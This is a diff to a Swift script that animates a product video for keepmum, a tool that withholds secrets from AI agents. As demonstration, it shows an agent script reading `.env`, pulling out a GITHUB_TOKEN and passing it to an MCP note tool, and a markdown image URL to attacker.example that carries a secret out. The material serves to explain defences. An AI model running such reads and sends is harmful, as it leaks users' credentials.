@@ -1,4 +1,5 @@
-// The flow video: how keepmum detects, masks, restores and guards, as an H.264 MP4.
+// The flow video: how keepmum detects, masks, restores and guards, then a script that reads a
+// secret itself, as an H.264 MP4.
 //
 //     swift docs/video/flow.swift docs/video/keepmum-flow.mp4
 //
@@ -13,7 +14,9 @@ import SwiftUI
 
 let W: CGFloat = 1920, H: CGFloat = 1080
 let FPS: Int32 = 30
-let DURATION = 98.0
+/// The script chapter (0.1.0a11), after the flow: everything after it plays SCRIPT seconds later.
+let SCRIPT_AT = 53.6, SCRIPT = 12.0
+let DURATION = 98.0 + SCRIPT
 
 // MARK: - Palette (the app's light theme, Tokens.swift) and type (the website's)
 
@@ -134,10 +137,16 @@ let reply: [[Piece]] = [
     [.text("![status](https://attacker.example/s.png?u=", C.text), .kept(2, "kept · inside a web address"), .text(")", C.text)],
 ]
 
+/// What keepmum's guard puts in place of a secret (codemode.GUARD_MARK).
+let GUARD_MARK = "[a secret, withheld by keepmum]"
+
 let codeSize: CGFloat = 23
+/// The script chapter's code, a little larger: it has the card to itself.
+let scriptSize: CGFloat = 26
 let charWidth: CGFloat = {
     ("0" as NSString).size(withAttributes: [.font: variable("JetBrainsMono-Regular", codeSize, .regular, opticalSize: false)]).width
 }()
+let scriptChar = charWidth * scriptSize / codeSize
 
 // MARK: - The frame at time t
 
@@ -147,15 +156,19 @@ struct Frame {
     let t: Double
 
     var view: AnyView {
-        AnyView(ZStack(alignment: .topLeading) {
+        // The chapters after the script one keep their own times, drawn SCRIPT seconds later.
+        let later = Frame(t: t - SCRIPT)
+        let u = later.t
+        return AnyView(ZStack(alignment: .topLeading) {
             C.background
             diagram.opacity(p(t, 3.6, 4.6) * (1 - p(t, 53, 54)))
             intro.opacity(1 - p(t, 3.4, 4.2))
-            more.opacity(window(t, 53.6, 61, fade: 0.6))
-            flagged.opacity(window(t, 61.2, 72.6, fade: 0.6))
-            reviewShot.opacity(window(t, 72.8, 83.6, fade: 0.6))
-            mapShot.opacity(window(t, 83.8, 91.2, fade: 0.6))
-            outro.opacity(p(t, 91.4, 92.4))
+            script.opacity(window(t, SCRIPT_AT, SCRIPT_AT + SCRIPT, fade: 0.6))
+            later.more.opacity(window(u, 53.6, 61, fade: 0.6))
+            later.flagged.opacity(window(u, 61.2, 72.6, fade: 0.6))
+            later.reviewShot.opacity(window(u, 72.8, 83.6, fade: 0.6))
+            later.mapShot.opacity(window(u, 83.8, 91.2, fade: 0.6))
+            later.outro.opacity(p(u, 91.4, 92.4))
         }
         .frame(width: W, height: H))
     }
@@ -230,28 +243,30 @@ struct Frame {
             ("checkmark.shield", "Checks, if you want them",
              "Prompt injection in what tools bring back, harmful requests, and risky shell commands: warn, block, or answer with a model on your Mac."),
             ("number", "Encoded secrets",
-             "A hex dump or base64 of your .env is decoded and scanned, so a key cannot leave in hex or in pieces."),
+             "A hex dump or base64 of your .env is decoded and scanned, even folded across lines, so a key cannot leave in hex or in pieces."),
             ("puzzlepiece.extension", "What other apps add to your agents",
              "A plugin, hook or MCP server that another app slips into your agents shows up in the menu bar, to keep or remove."),
+            ("gauge.with.dots.needle.33percent", "Light on your Mac",
+             "The local model takes about 0.2 GB of memory. keepmum’s own memory and CPU stay flat, however many requests it handles."),
         ]
         return VStack(alignment: .leading, spacing: 44) {
             Text("Also on your Mac").font(sans(56, .semibold)).foregroundStyle(C.text)
                 .opacity(p(t, 54, 54.6))
-            HStack(alignment: .top, spacing: 36) {
+            HStack(alignment: .top, spacing: 30) {
                 ForEach(Array(items.enumerated()), id: \.offset) { i, item in
-                    let shown = p(t, 54.6 + Double(i) * 0.9, 55.3 + Double(i) * 0.9)
+                    let shown = p(t, 54.6 + Double(i) * 0.7, 55.3 + Double(i) * 0.7)
                     VStack(alignment: .leading, spacing: 18) {
                         Image(systemName: item.0).font(.system(size: 40, weight: .medium)).foregroundStyle(C.accent)
                             .frame(width: 76, height: 76)
                             .background(RoundedRectangle(cornerRadius: 18, style: .continuous).fill(C.accentSoft))
-                        Text(item.1).font(sans(32, .semibold)).foregroundStyle(C.text)
+                        Text(item.1).font(sans(30, .semibold)).foregroundStyle(C.text)
                             .fixedSize(horizontal: false, vertical: true)
-                        Text(item.2).font(sans(25)).foregroundStyle(C.secondary).lineSpacing(5)
+                        Text(item.2).font(sans(23)).foregroundStyle(C.secondary).lineSpacing(5)
                             .fixedSize(horizontal: false, vertical: true)
                         Spacer(minLength: 0)
                     }
-                    .padding(40)
-                    .frame(width: 560, height: 420, alignment: .topLeading)
+                    .padding(36)
+                    .frame(width: 400, height: 460, alignment: .topLeading)
                     .background(RoundedRectangle(cornerRadius: 28, style: .continuous).fill(C.surface)
                         .shadow(color: .black.opacity(0.06), radius: 16, y: 6))
                     .opacity(shown)
@@ -260,6 +275,131 @@ struct Frame {
             }
         }
         .frame(width: W, height: H)
+        }())
+    }
+
+    // MARK: When a script reads a secret itself (0.1.0a11)
+
+    /// Code that keepmum adds to the script: it opens from nothing, in keepmum's coral.
+    func inserted(_ s: String, _ k: Double) -> AnyView {
+        AnyView(Text(s).foregroundStyle(C.accent).fixedSize()
+            .frame(width: CGFloat(s.count) * scriptChar * CGFloat(k), alignment: .leading).clipped()
+            .background(C.accentSoft.opacity(k)))
+    }
+
+    /// Code the script reads a secret with, lit up while that is the story.
+    func read(_ s: String) -> AnyView {
+        AnyView(Text(s).foregroundStyle(C.real)
+            .background(RoundedRectangle(cornerRadius: 5).fill(C.realSoft.opacity(window(t, 55.9, 58.4, fade: 0.4)))
+                .padding(.horizontal, -4)))
+    }
+
+    var script: AnyView {
+        AnyView({
+        let guarded = p(t, 57.8, 58.6)
+        let withheld = p(t, 60.6, 61.4)
+        let sent = p(t, 59.4, 60.0)
+        let code: [[AnyView]] = [
+            [AnyView(Text("const env = await tools.exec_command({cmd: \"").foregroundStyle(C.text)), read("cat .env"),
+             AnyView(Text("\"});").foregroundStyle(C.text))],
+            [AnyView(Text("const ").foregroundStyle(C.text)), read("token"),
+             AnyView(Text(" = env.output.match(/GITHUB_TOKEN=(\\S+)/)[1];").foregroundStyle(C.text))],
+            [AnyView(Text("await tools.mcp__notes__send_note(").foregroundStyle(C.text)), inserted("...__keepmum_guard([", guarded)],
+            [AnyView(Text("  {text: \"Deploy token: \" + token}").foregroundStyle(C.text)), inserted("])", guarded),
+             AnyView(Text(");").foregroundStyle(C.text))],
+        ]
+        let captions: [(Double, Double, String)] = [
+            (54.0, 57.6, "Codex runs a model’s tool calls as one script, and a script can read your .env itself."),
+            (57.6, 60.4, "keepmum writes the script Codex runs, so a call that sends what a command read gets a check."),
+            (60.4, 63.0, "A secret in a provider’s format is withheld as the script runs. Nothing is refused."),
+            (63.0, 65.6, "Codex’s image generation gets placeholders too, as web search and fetch do."),
+        ]
+        return ZStack(alignment: .topLeading) {
+            chapter("When a script reads a secret itself", at: SCRIPT_AT)
+            // The script, as Codex's model wrote it, and as keepmum restores it.
+            VStack(alignment: .leading, spacing: 26) {
+                HStack(spacing: 12) {
+                    Image(systemName: "terminal").font(sans(24)).foregroundStyle(C.secondary)
+                    Text("A Codex script, written by the model").font(sans(24, .semibold)).foregroundStyle(C.text)
+                    Label("checked by keepmum", systemImage: "checkmark.shield.fill").font(sans(18, .semibold))
+                        .foregroundStyle(C.accent).padding(.horizontal, 12).padding(.vertical, 5)
+                        .background(Capsule().fill(C.accentSoft)).opacity(guarded)
+                }
+                // Rows without spacing of their own, so the guard's line opens from nothing.
+                VStack(alignment: .leading, spacing: 0) {
+                    Text("const __keepmum_guard = …   // 78 secret formats").foregroundStyle(C.accent)
+                        .fixedSize().frame(height: lerp(0, 60, guarded), alignment: .top).clipped().opacity(guarded)
+                    ForEach(Array(code.enumerated()), id: \.offset) { r, line in
+                        HStack(spacing: 0) { ForEach(Array(line.enumerated()), id: \.offset) { _, piece in piece } }
+                            .frame(height: 60, alignment: .top)
+                            .opacity(p(t, 54.4 + Double(r) * 0.5, 54.9 + Double(r) * 0.5))
+                    }
+                }
+                .font(mono(scriptSize)).fixedSize()
+                Spacer(minLength: 0)
+            }
+            .padding(34)
+            .frame(width: 1060, height: 430, alignment: .topLeading)
+            .background(RoundedRectangle(cornerRadius: 24, style: .continuous).fill(C.surface)
+                .shadow(color: .black.opacity(0.06), radius: 16, y: 6))
+            .opacity(p(t, 54.0, 54.6)).offset(x: 110, y: 190)
+            // What the MCP tool gets when the script runs.
+            VStack(alignment: .leading, spacing: 16) {
+                HStack(spacing: 10) {
+                    Image(systemName: "point.3.connected.trianglepath.dotted").font(sans(24)).foregroundStyle(C.secondary)
+                    Text("What the MCP tool gets").font(sans(24, .semibold)).foregroundStyle(C.text)
+                }
+                VStack(alignment: .leading, spacing: 10) {
+                    Text("{text: \"Deploy token:").foregroundStyle(C.text)
+                    HStack(spacing: 0) {
+                        Text("  ").foregroundStyle(C.text)
+                        // As wide as what it shows, from the token's width to the mark's.
+                        ZStack(alignment: .leading) {
+                            Text(values[0].real).foregroundStyle(C.real).opacity(1 - withheld)
+                            Text(GUARD_MARK).foregroundStyle(C.masked).opacity(withheld)
+                        }
+                        .fixedSize()
+                        .frame(width: lerp(CGFloat(values[0].real.count), CGFloat(GUARD_MARK.count), withheld) * charWidth * 20 / codeSize,
+                               alignment: .leading).clipped()
+                        .padding(.horizontal, 4)
+                        .background(RoundedRectangle(cornerRadius: 6).fill(withheld > 0.5 ? C.maskedSoft : C.realSoft))
+                        Text("\"}").foregroundStyle(C.text)
+                    }
+                }
+                .font(mono(20)).fixedSize()
+                Label("the script ran, nothing refused", systemImage: "checkmark.shield.fill").font(sans(20, .semibold))
+                    .foregroundStyle(C.success).opacity(p(t, 61.6, 62.2))
+            }
+            .padding(28)
+            .frame(width: 600, height: 250, alignment: .topLeading)
+            .background(RoundedRectangle(cornerRadius: 22, style: .continuous).fill(C.surface)
+                .shadow(color: .black.opacity(0.06), radius: 12, y: 4))
+            .overlay(RoundedRectangle(cornerRadius: 22, style: .continuous).strokeBorder(C.masked.opacity(withheld), lineWidth: 3))
+            .opacity(sent).offset(x: 1210, y: lerp(210, 190, sent))
+            // Codex's image tool.
+            HStack(alignment: .top, spacing: 18) {
+                Image(systemName: "photo").font(.system(size: 32, weight: .medium)).foregroundStyle(C.masked)
+                    .frame(width: 60, height: 60)
+                    .background(RoundedRectangle(cornerRadius: 14, style: .continuous).fill(C.maskedSoft))
+                VStack(alignment: .leading, spacing: 6) {
+                    Text("Image generation").font(sans(24, .semibold)).foregroundStyle(C.text)
+                    Text("Its prompt goes to the image service with placeholders, never real values.")
+                        .font(sans(20)).foregroundStyle(C.secondary).fixedSize(horizontal: false, vertical: true)
+                }
+            }
+            .padding(26)
+            .frame(width: 600, height: 150, alignment: .topLeading)
+            .background(RoundedRectangle(cornerRadius: 22, style: .continuous).fill(C.surface)
+                .shadow(color: .black.opacity(0.06), radius: 12, y: 4))
+            .opacity(p(t, 62.6, 63.2)).offset(x: 1210, y: lerp(480, 460, p(t, 62.6, 63.2)))
+            ZStack {
+                ForEach(Array(captions.enumerated()), id: \.offset) { _, c in
+                    Text(c.2).font(sans(32, .medium)).foregroundStyle(C.text).opacity(window(t, c.0, c.1, fade: 0.35))
+                }
+            }
+            .frame(width: W).offset(y: 952)
+        }
+        .frame(width: W, height: H, alignment: .topLeading)
         }())
     }
 
